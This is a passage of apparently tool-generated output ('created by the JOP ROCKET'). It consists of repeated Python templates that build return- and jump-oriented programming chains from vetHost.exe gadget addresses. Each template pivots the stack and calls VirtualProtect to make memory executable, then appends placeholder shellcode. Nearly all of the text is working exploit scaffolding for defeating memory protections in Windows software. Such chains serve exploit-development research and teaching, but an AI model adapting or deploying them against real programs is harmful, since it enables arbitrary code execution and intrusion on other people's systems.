		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013ac, # (base + 0x13ac), # pop esi # xor ecx, ecx # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x18 bytes] 0x54
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013ac, # (base + 0x13ac), # pop esi # xor ecx, ecx # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x18 bytes] 0x6c ** 
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013ac, # (base + 0x13ac), # pop esi # xor ecx, ecx # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x18 bytes] 0x84 **^ 
		# N----> STACK PIVOT TOTAL: 0x84 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDX #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x110153b8, # (base + 0x153b8), # pop edx # ret  # vetHost.exe   Load EDX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x14
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x64
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013ac, # (base + 0x13ac), # pop esi # xor ecx, ecx # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x18 bytes] 0x7c
		# N----> STACK PIVOT TOTAL: 0x7c bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDX #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x110153b8, # (base + 0x153b8), # pop edx # ret  # vetHost.exe   Load EDX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x11
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x22
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x33
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x44
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x55
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x66
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013ac, # (base + 0x13ac), # pop esi # xor ecx, ecx # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x18 bytes] 0x7e
		# N----> STACK PIVOT TOTAL: 0x7e bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDX #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x110153b8, # (base + 0x153b8), # pop edx # ret  # vetHost.exe   Load EDX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013ac, # (base + 0x13ac), # pop esi # xor ecx, ecx # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x18 bytes] 0x88
		# N----> STACK PIVOT TOTAL: 0x88 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDX #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x110153b8, # (base + 0x153b8), # pop edx # ret  # vetHost.exe   Load EDX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0xc
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x24
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x54
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002619, # (base + 0x2619), # pop edi # pop esi # mov eax, 1 # pop ebx # jmp edx # vetHost.exe  [0xc bytes]** 0x6c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013ac, # (base + 0x13ac), # pop esi # xor ecx, ecx # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x18 bytes] 0x84
		# N----> STACK PIVOT TOTAL: 0x84 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDI #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017295, # (base + 0x17295), # pop edi # ret  # vetHost.exe   Load EDI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x11
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x22
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x33
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x44
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x55
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x66
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes] 0x77
		# N----> STACK PIVOT TOTAL: 0x77 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDI #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017295, # (base + 0x17295), # pop edi # ret  # vetHost.exe   Load EDI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c44, # (base + 0x1c44), # pop ebp # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0x10 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes] 0x81
		# N----> STACK PIVOT TOTAL: 0x81 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDI #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017295, # (base + 0x17295), # pop edi # ret  # vetHost.exe   Load EDI with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0xc
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x24
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x54
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c45, # (base + 0x1c45), # pop ebx # add esp, 8 # jmp eax # vetHost.exe  [0xc bytes]** 0x6c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes] 0x7d
		# N----> STACK PIVOT TOTAL: 0x7d bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
